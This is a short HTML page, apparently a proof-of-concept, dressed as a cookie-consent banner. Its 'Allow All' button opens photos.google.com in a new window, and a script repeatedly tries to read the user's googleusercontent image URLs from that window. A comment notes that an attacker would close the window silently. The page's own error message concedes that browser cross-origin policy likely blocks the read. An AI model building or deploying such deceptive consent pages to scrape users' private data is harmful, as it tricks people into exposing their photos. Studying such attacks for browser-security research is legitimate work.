<!DOCTYPE html>
<html>
<head>
<title>Cookie Settings</title>
<style>
body { font-family: sans-serif; padding: 20px; }
button { padding: 10px 20px; font-size: 16px; }
pre { white-space: pre-wrap; word-wrap: break-word; }
</style>
</head>
<body>
<h2>We use cookies to improve your experience</h2>
<p>Click "Allow All" to continue.</p>
<button id="allow">Allow All</button>

<h3>Scraped Image URLs:</h3>
<pre id="output">[waiting for user...]</pre>

<script>
document.getElementById('allow').onclick = () => {
const win = window.open("https://photos.google.com", "_blank");

const interval = setInterval(() => {
try {
const imgs = win.document.querySelectorAll('img');
const urls = Array.from(imgs)
.map(img => img.src)
.filter(src => src.startsWith("https://lh3.googleusercontent.com/"));

if (urls.length > 0) {
document.getElementById("output").textContent = urls.join("\n");
clearInterval(interval);
win.close(); // attacker would do this silently
}
} catch (e) {
document.getElementById("output").textContent = "‚ùå Cannot access photos.google.com content (likely due to browser cross-origin policy)";
}
}, 2000);
};
</script>
</body>
</html>
